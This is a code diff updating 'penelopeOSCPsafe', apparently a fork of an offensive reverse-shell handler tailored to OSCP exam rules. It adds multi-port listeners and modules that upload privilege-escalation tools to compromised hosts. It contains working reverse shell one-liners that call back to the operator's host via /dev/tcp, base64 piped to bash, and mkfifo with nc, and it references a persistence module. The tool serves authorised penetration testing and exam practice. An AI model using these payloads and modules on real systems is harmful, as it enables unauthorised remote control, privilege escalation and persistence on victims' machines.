@@ -1,27 +1,13 @@
 #!/usr/bin/env python3
 
-# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>
-
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-
-# You should have received a copy of the GNU General Public License
-# along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
 __program__= "penelopeOSCPsafe"
-__version__ = "0.14.9"
+__version__ = "0.14.14"
 
 import os
 import io
 import re
 import sys
+import pwd
 import tty
 import ssl
 import time
@@ -51,7 +37,7 @@ from zlib import compress
 from errno import EADDRINUSE, EADDRNOTAVAIL
 from select import select
 from pathlib import Path, PureWindowsPath
-from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
+from argparse import ArgumentParser, RawTextHelpFormatter
 from datetime import datetime
 from textwrap import indent, dedent
 from binascii import Error as binascii_error
@@ -61,6 +47,7 @@ from http.server import SimpleHTTPRequestHandler
 from urllib.parse import unquote
 from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 ################################## PYTHON MISSING BATTERIES ####################################
 from string import ascii_letters
@@ -126,9 +113,6 @@ class Interfaces:
 		for name, ip in self.list.items():
 			table += [paint(name).cyan, paint(ip).yellow]
 		return str(table)
-
-	def oneLine(self):
-		return '(' + str(self).replace('\n', '|') + ')'
 
 	def translate(self, interface_name):
 		if interface_name in self.list:
@@ -751,7 +735,7 @@ class MainMenu(BetterCMD):
 				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
 		) if self.sid else ''
 		self.prompt = (
-				f"{paint(f'(').cyan_DIM}{paint('PenelopeOSCPsafe').magenta}{paint(f')').cyan_DIM}"
+				f"{paint(f'(').cyan_DIM}{paint('penelopeOSCPsafe').magenta}{paint(f')').cyan_DIM}"
 				f"{session_part}{paint('>').cyan_DIM} "
 		)
 
@@ -940,7 +924,7 @@ class MainMenu(BetterCMD):
 
 		if options.single_session and len(core.sessions) == 1:
 			core.stop()
-			logger.info("PenelopeOSCPsafe exited due to Single Session mode")
+			logger.info("penelopeOSCPsafe exited due to Single Session mode")
 			return True
 
 	@session_operation(current=True)
@@ -1071,7 +1055,7 @@ class MainMenu(BetterCMD):
 			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
 		"""
 		if local_items:
-			core.sessions[self.sid].upload(local_items, randomize_fname=True)
+			core.sessions[self.sid].upload(local_items, randomize_fname=options.upload_random_suffix)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
@@ -1272,7 +1256,7 @@ class MainMenu(BetterCMD):
 
 	def do_listeners(self, line):
 		"""
-		[<add|stop>[-i <iface>][-p <port>]]
+		[add[-i<iface>][-p<port>]|stop<id>]
 		Add / stop / view Listeners
 
 		Examples:
@@ -1287,7 +1271,7 @@ class MainMenu(BetterCMD):
 
 			parser_add = subparsers.add_parser("add", help="Add a new listener")
 			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
-			parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
+			parser_add.add_argument("-p", "--ports", help="Ports to listen on (comma separated)", default=[options.default_listener_port])
 			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')
 
 			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
@@ -1299,8 +1283,10 @@ class MainMenu(BetterCMD):
 				return False
 
 			if args.command == "add":
+				options.ports = args.ports
 				if args.type == 'tcp':
-					TCPListener(args.interface, args.port)
+					for port in options.ports:
+						TCPListener(args.interface, port)
 
 			elif args.command == "stop":
 				if args.id == '*':
@@ -1351,13 +1337,13 @@ class MainMenu(BetterCMD):
 
 	def do_payloads(self, line):
 		"""
-
+		[interface_name]
 		Create reverse shell payloads based on the active listeners
 		"""
 		if core.listeners:
 			print()
 			for listener in core.listeners.values():
-				print(listener.payloads, end='\n\n')
+				print(listener.payloads(line))
 		else:
 			cmdlogger.warning("No Listeners to show payloads")
 
@@ -1371,9 +1357,9 @@ class MainMenu(BetterCMD):
 	def do_exit(self, line):
 		"""
 
-		Exit PenelopeOSCPsafe
+		Exit penelopeOSCPsafe
 		"""
-		if ask(f"Exit PenelopeOSCPsafe?{self.active_sessions} (y/N): ").lower() == 'y':
+		if ask(f"Exit penelopeOSCPsafe?{self.active_sessions} (y/N): ").lower() == 'y':
 			super().do_exit(line)
 			core.stop()
 			for thread in threading.enumerate():
@@ -1480,6 +1466,9 @@ class MainMenu(BetterCMD):
 			return [_type for _type in ("tcp",) if _type.startswith(text)]
 		elif arg == 'stop':
 			return self.get_core_id_completion(text, "*", attr='listeners')
+
+	def complete_payloads(self, text, line, begidx, endidx):
+		return [iface for iface in Interfaces().list if iface.startswith(text)]
 
 	def complete_upload(self, text, line, begidx, endidx):
 		return __class__.file_completer(text)
@@ -1769,7 +1758,7 @@ def handle_bind_errors(func):
 			    ./penelopeOSCPsafe.py {port}
 			    sudo setcap 'cap_net_bind_service=-ep' {os.path.realpath(sys.executable)}
 
-			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelope)
+			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelopeOSCPsafe)
 			    sudo ./penelopeOSCPsafe.py {port}
 			"""))
 
@@ -1870,7 +1859,7 @@ class TCPListener:
 		core.control << "" # TODO
 
 		if options.payloads:
-			print(self.payloads)
+			print(self.payloads())
 
 	def stop(self):
 
@@ -1893,8 +1882,7 @@ class TCPListener:
 		else:
 			logger.warning(f"Stopping {self}")
 
-	@property
-	def payloads(self):
+	def payloads(self, interface_filter=None):
 		interfaces = Interfaces().list
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
@@ -1909,8 +1897,12 @@ class TCPListener:
 		if self.host == '0.0.0.0':
 			ips = [ip for ip in interfaces.values()]
 
+		interface_count = 0
 		for ip in ips:
 			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
+			if interface_filter and iface_name != interface_filter:
+				continue
+			interface_count += 1
 			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
 			output.append(str(paint("Bash TCP").UNDERLINE))
 			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
@@ -1930,7 +1922,9 @@ class TCPListener:
 			""").split("\n"))
 
 		output.append("─" * 80)
-		return '\n'.join(output)
+		if not interface_count:
+			return ""
+		return '\n'.join(output) + "\n"
 
 
 class Channel:
@@ -2427,10 +2421,7 @@ class Session:
 		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))
 
 		def expect(data):
-			try:
-				data = data.decode()
-			except:
-				return False
+			data = data.decode(errors="replace")
 
 			if var_value1 + var_value2 in data:
 				return True
@@ -2452,7 +2443,7 @@ class Session:
 		)
 
 		if response:
-			response = response.decode()
+			response = response.decode(errors="replace")
 
 			if var_value1 + var_value2 in response:
 				self.OS = 'Unix'
@@ -2471,7 +2462,7 @@ class Session:
 				self.echoing = True
 				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
 				self.prompt = prompt[1].encode() if prompt else b""
-				win_version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)
+				win_version = re.search(r"Microsoft Windows \[.* (.*)\]", response, re.DOTALL)
 				if win_version:
 					self.win_version = win_version[1]
 
@@ -2658,7 +2649,7 @@ class Session:
 				os.close(stdin_stream._read)
 				del self.streams[stdin_stream.id]
 
-				return buffer.getvalue().rstrip().decode() if value else True
+				return buffer.getvalue().rstrip().decode(errors="replace") if value else True
 			return None
 
 		with self.lock:
@@ -2817,7 +2808,7 @@ class Session:
 			if value and self.subchannel.result is not False:
 				if self.OS == 'Windows' and self.type == 'PTY': # quirk
 					self.subchannel.result = re.sub(rb'\x1b\[(?:K|\?25h|25l|82X)', b'', self.subchannel.result)
-				self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
+				self.subchannel.result = self.subchannel.result.strip().decode(errors="replace") # TODO check strip
 			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
 			self.subchannel.active = False
 
@@ -2841,21 +2832,13 @@ class Session:
 		answer = ask("Select action: ")
 
 		if answer == "1":
-			return self.upload(
-				url,
-				remote_path="/var/tmp",
-				randomize_fname=False
-			)[0]
+			return self.upload(url, remote_path="/var/tmp")[0]
 
 		elif answer == "2":
 			local_path = ask(f"Enter {name} local path: ")
 			if local_path:
 				if os.path.exists(local_path):
-					return self.upload(
-						local_path,
-						remote_path=self.tmp,
-						randomize_fname=False
-					)[0]
+					return self.upload(local_path, remote_path=self.tmp)[0]
 				else:
 					logger.error("The local path does not exist...")
 
@@ -3095,9 +3078,20 @@ class Session:
 		elif self.need_control_session:
 			self.exec(f"cd {self.cwd}")
 
+	def get_subtype(self):
+		response = self.exec("$PSVersionTable", expect_func=lambda x: b":\\" in x, raw=True)
+		if response:
+			if b"SerializationVersion" in response:
+				self.subtype = 'psh'
+			else:
+				self.subtype = 'cmd'
+
 	def detach(self):
 		if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
 			threading.Thread(target=self.sync_cwd).start()
+
+		if self and self.OS == 'Windows' and self.type != 'PTY':
+			threading.Thread(target=self.get_subtype).start()
 
 		if threading.current_thread().name != 'Core':
 			core.control << f'self.sessions[{self.id}].detach()'
@@ -3120,7 +3114,7 @@ class Session:
 		else:
 			if options.single_session and not core.sessions:
 				core.stop()
-				logger.info("PenelopeOSCPsafe exited due to Single Session mode")
+				logger.info("penelopeOSCPsafe exited due to Single Session mode")
 				return
 			menu.set_id(None)
 		menu.show()
@@ -4290,7 +4284,8 @@ def agent():
 
 
 def modules():
-	return {module.__name__:module for module in Module.__subclasses__()}
+	mods = {module.__name__:module for module in Module.__subclasses__()}
+	return mods
 
 
 class Module:
@@ -4298,6 +4293,53 @@ class Module:
 	on_session_start = False
 	on_session_end = False
 	category = "Misc"
+
+
+class upload_privesc_scripts(Module):
+    category = "Privilege Escalation"
+    
+    def run(session, args):
+        """Upload a set of privilege escalation scripts to the target"""
+        if session.OS == 'Unix':
+            session.upload(URLS['linpeas'])
+            session.upload(URLS['lse'])
+            session.upload(URLS['deepce'])
+            
+            # Traitor removed as it's unsafe for OSCP
+            
+            print()
+            if session.arch == "x86_64":
+                session.upload(URLS['pspy64'])
+            elif session.arch in ("i386", "i686"):
+                session.upload(URLS['pspy32'])
+            else:
+                logger.error("pspy: No compatible binary architecture")
+                
+        elif session.OS == 'Windows':
+            session.upload(URLS['winpeas'])
+            session.upload(URLS['powerup'])
+            session.upload(URLS['privesccheck'])
+
+
+class peass_ng(Module):
+    category = "Privilege Escalation"
+    
+    def run(session, args):
+        """Run PEASS-ng for privilege escalation enumeration"""
+        if session.OS == 'Unix':
+            # Remove argument parsing since we only need to run linpeas
+            output_file = session.script(URLS['linpeas'])
+            return True
+        elif session.OS == 'Windows':
+            logger.error("This module runs only on Unix shells")
+            while True:
+                answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
+                if answer in ('y', ''):
+                    menu.do_run('upload_privesc_scripts')
+                    break
+                elif answer == 'n':
+                    break
+
 
 class lse(Module):
 	category = "Privilege Escalation"
@@ -4321,7 +4363,6 @@ class linuxexploitsuggester(Module):
 			session.script(URLS['les'])
 		else:
 			logger.error("This module runs only on Unix shells")
-
 
 class panix(Module):
 	category = "Persistence"
@@ -4606,7 +4647,7 @@ def custom_excepthook(*args):
 		return
 	print("\n", paint('Oops...').RED, '🐞\n', paint().yellow, '─' * 80, sep='')
 	sys.__excepthook__(exc_type, exc_value, exc_traceback)
-	print('─' * 80, f"\n{paint('PenelopeOSCPsafe version:').red} {paint(__version__).green}")
+	print('─' * 80, f"\n{paint('penelopeOSCPsafe version:').red} {paint(__version__).green}")
 	print(f"{paint('Python version:').red} {paint(sys.version).green}")
 	print(f"{paint('System:').red} {paint(platform.version()).green}\n")
 
@@ -4696,23 +4737,34 @@ def url_to_bytes(URL):
 	return filename, data
 
 def check_urls():
+	threads = 10
 	global URLS
 	urls = URLS.values()
 	space_num = len(max(urls, key=len))
 	all_ok = True
-	for url in urls:
+
+	def _probe(url):
 		req = Request(url, method="HEAD", headers={'User-Agent': options.useragent})
 		try:
 			with urlopen(req, timeout=5) as response:
-				status_code = response.getcode()
+				return url, response.getcode(), None
 		except HTTPError as e:
-			all_ok = False
-			status_code = e.code
-		except:
-			return None
-		if __name__ == '__main__':
-			color = 'RED' if status_code >= 400 else 'GREEN'
-			print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
+			return url, e.code, None
+		except Exception as e:
+			return url, None, e
+
+	with ThreadPoolExecutor(threads) as ex:
+		futures = {ex.submit(_probe, url): url for url in urls}
+		for fut in as_completed(futures):
+			url, status_code, err = fut.result()
+			if err is not None:
+				status_code = err
+				all_ok = False
+			elif status_code >= 400:
+				all_ok = False
+			if __name__ == '__main__':
+				color = 'RED' if isinstance(status_code, int) and status_code >= 400 or err else 'GREEN'
+				print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
 	return all_ok
 
 def listener_menu():
@@ -4746,7 +4798,7 @@ def listener_menu():
 				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 				print()
 				for listener in core.listeners.values():
-					print(listener.payloads, end='\n\n')
+					print(listener.payloads(), end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
 			elif command in ('q', '\x03'):
@@ -4799,7 +4851,12 @@ class Options:
 	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
 
 	def __init__(self):
-		self.basedir = Path.home() / f'.{__program__}'
+		real_home = Path.home()
+		sudo_user = os.environ.get("SUDO_USER")
+		if sudo_user:
+			real_home = Path(pwd.getpwnam(sudo_user).pw_dir)
+
+		self.basedir = real_home / f'.{__program__}'
 		self.default_listener_port = 4444
 		self.default_bindshell_port = 5555
 		self.default_fileserver_port = 8000
@@ -4831,6 +4888,7 @@ class Options:
 		self.cmd_histfile = 'cmd_history'
 		self.debug_histfile = 'cmd_debug_history'
 		self.useragent = "Wget/1.21.2"
+		self.upload_random_suffix = False
 		self.attach_lines = 20
 
 	def __getattribute__(self, option):
@@ -4870,6 +4928,12 @@ class Options:
 			elif type(value) is str:
 				value = re.split('[^a-zA-Z0-9]+', value)
 
+		elif option == 'ports':
+			if value is None:
+				value = [None]
+			elif type(value) is str:
+				value = re.split('[^a-zA-Z0-9]+', value)
+
 		elif option == 'proxy':
 			if not value:
 				os.environ.pop('http_proxy', '')
@@ -4894,44 +4958,44 @@ class Options:
 def main():
 
 	## Command line options
-	parser = ArgumentParser(description="PenelopeOSCPsafe Shell Handler", add_help=False,
-		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))
+	parser = ArgumentParser(description="penelopeOSCPsafe Shell Handler", add_help=False,
+		formatter_class=lambda prog: RawTextHelpFormatter(prog, width=150, max_help_position=40))
 
-	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
-		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
-	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")
+	parser.add_argument("-p", "--ports", help=f"Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options\n\
+(Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port})")
+	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell modes")
 
 	method = parser.add_argument_group("Reverse or Bind shell?")
-	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
+	method.add_argument("-i", "--interface", help="Local interface/IP to listen. (Default: 0.0.0.0)", metavar='')
 	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
 
 	hints = parser.add_argument_group("Hints")
-	hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
-	hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
+	hints.add_argument("-a", "--payloads", help="Show sample reverse shell payloads for active Listeners", action="store_true")
+	hints.add_argument("-l", "--interfaces", help="List available network interfaces", action="store_true")
 	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")
 
 	log = parser.add_argument_group("Session Logging")
-	log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
-	log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
-	log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")
+	log.add_argument("-L", "--no-log", help="Disable session log files", action="store_true")
+	log.add_argument("-T", "--no-timestamps", help="Disable timestamps in logs", action="store_true")
+	log.add_argument("-CT", "--no-colored-timestamps", help="Disable colored timestamps in logs", action="store_true")
 
 	misc = parser.add_argument_group("Misc")
-	misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
-	misc.add_argument("-M", "--menu", help="Just land to the Main Menu", action="store_true")
+	misc.add_argument("-m", "--maintain", help="Keep N sessions per target", type=int, metavar='')
+	misc.add_argument("-M", "--menu", help="Start in the Main Menu.", action="store_true")
 	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
-	misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
-	misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
+	misc.add_argument("-C", "--no-attach", help="Do not auto-attach on new sessions", action="store_true")
+	misc.add_argument("-U", "--no-upgrade", help="Disable shell auto-upgrade", action="store_true")
 
 	misc = parser.add_argument_group("File server")
-	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
-	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')
+	misc.add_argument("-s", "--serve", help="Run HTTP file server mode", action="store_true")
+	misc.add_argument("-prefix", "--url-prefix", help="URL path prefix", type=str, metavar='')
 
 	debug = parser.add_argument_group("Debug")
-	debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
-	debug.add_argument("-v", "--version", help="Show PenelopeOSCPsafe version", action="store_true")
-	debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
-	debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
-	debug.add_argument("-cu", "--check-urls", help="Check health of hardcoded URLs", action="store_true")
+	debug.add_argument("-N", "--no-bins", help="Simulate missing binaries on target (comma-separated)", metavar='')
+	debug.add_argument("-v", "--version", help="Print version and exit", action="store_true")
+	debug.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
+	debug.add_argument("-dd", "--dev-mode", help="Enable developer mode", action="store_true")
+	debug.add_argument("-cu", "--check-urls", help="Check hardcoded URLs health and exit", action="store_true")
 
 	parser.parse_args(None, options)
 
@@ -4967,20 +5031,22 @@ def main():
 
 	# File Server
 	elif options.serve:
-		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
-		if server.filemap:
-			server.start()
-		else:
-			logger.error("No files to serve")
+		for port in options.ports:
+			server = FileServer(*options.args or '.', port=port, host=options.interface, url_prefix=options.url_prefix)
+			if server.filemap:
+				server.start()
+			else:
+				logger.error("No files to serve")
 
 	# Reverse shell via SSH
 	elif options.args and options.args[0] == "ssh":
 		if len(options.args) > 1:
-			TCPListener(host=options.interface, port=options.port)
-			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
-				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
-				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
-			)
+			for port in options.ports:
+				TCPListener(host=options.interface, port=port)
+				options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={port or options.default_listener_port};"
+					f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
+					f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
+				)
 		try:
 			if subprocess.run(options.args).returncode == 0:
 				logger.info("SSH command executed!")
@@ -4993,15 +5059,20 @@ def main():
 
 	# Bind shell
 	elif options.connect:
-		if not Connect(options.connect, options.port or options.default_bindshell_port):
+		success = False
+		for port in options.ports:
+			if Connect(options.connect, port or options.default_bindshell_port):
+				success = True
+		if not success:
 			sys.exit(1)
 		menu.start()
 
-	# Reverse Listener
+	# Reverse Listeners
 	else:
-		TCPListener(host=options.interface, port=options.port)
-		if not core.listeners:
-			sys.exit(1)
+		for port in options.ports:
+			TCPListener(host=options.interface, port=port)
+			if not core.listeners:
+				sys.exit(1)
 
 		listener_menu()
 		signal.signal(signal.SIGINT, keyboard_interrupt)
@@ -5011,7 +5082,7 @@ def main():
 
 # Check Python version
 if not sys.version_info >= (3, 6):
-	print("(!) PenelopeOSCPsafe requires Python version 3.6 or higher (!)")
+	print("(!) penelopeOSCPsafe requires Python version 3.6 or higher (!)")
 	sys.exit(1)
 
 # Apply default options
@@ -5076,6 +5147,9 @@ URLS = {
 	'ngrok_linux':	"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
 	'uac_linux':	"https://github.com/tclahr/uac/releases/download/v3.2.0/uac-3.2.0.tar.gz",
 	'linux_procmemdump':	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
+	'traitor_386':		"https://github.com/liamg/traitor/releases/latest/download/traitor-386",
+	'traitor_amd64':	"https://github.com/liamg/traitor/releases/latest/download/traitor-amd64",
+	'traitor_arm64':	"https://github.com/liamg/traitor/releases/latest/download/traitor-arm64",
 	'pspy32':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
 	'pspy64':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
 	'panix':	"https://github.com/Aegrah/PANIX/releases/latest/download/panix.sh",
